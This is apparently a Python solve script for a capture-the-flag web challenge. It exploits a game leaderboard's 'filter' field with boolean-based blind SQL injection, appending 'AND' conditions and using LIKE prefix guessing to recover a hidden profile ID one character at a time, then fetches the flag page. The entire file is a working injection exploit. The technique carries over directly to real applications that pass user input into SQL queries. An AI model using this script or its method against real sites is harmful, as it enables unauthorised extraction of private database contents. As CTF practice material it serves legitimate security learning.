from bs4 import BeautifulSoup
from utils.flag_strings import hex_flag_chars_lower as chars
import requests


chars = [char for char in chars if char not in "%_"]  # avoid SQL wildcards


def query(query_str: str) -> bool:
    req = requests.post("https://game-leaderboard.tjc.tf/", {"filter": f"75 AND {query_str}"})
    soup = BeautifulSoup(req.content.decode(), "html.parser")

    return soup.tr is not None  # check if rank 1 row exists, other rows filtered by min score

    # results = []
    # for row in soup.tbody.find_all("tr"):
    #     cells = [cell.text for cell in row.find_all("td")]
    #     results.append((int(cells[0]), cells[1], int(cells[2])))
    # return results


def query_prefix(prefix: str) -> bool:
    return query(f"profile_id LIKE '{prefix}%'")


def query_profile_id(profile_id: str) -> bool:
    return query(f"profile_id='{profile_id}'")


def main():
    assert query_prefix("") is True
    assert query_prefix("definitely not correct") is False

    prefix = ""

    while query_profile_id(prefix) is False:
        print(f"Current prefix: '{prefix}'")

        for char in chars:
            print(f"Testing '{prefix + char}'")
            if query_prefix(prefix + char):
                prefix += char
                break

    profile_id = prefix
    print(f"Profile id: {profile_id}")
    flag = requests.get(f"https://game-leaderboard.tjc.tf/user/{profile_id}").text
    print(flag)


if __name__ == '__main__':
    main()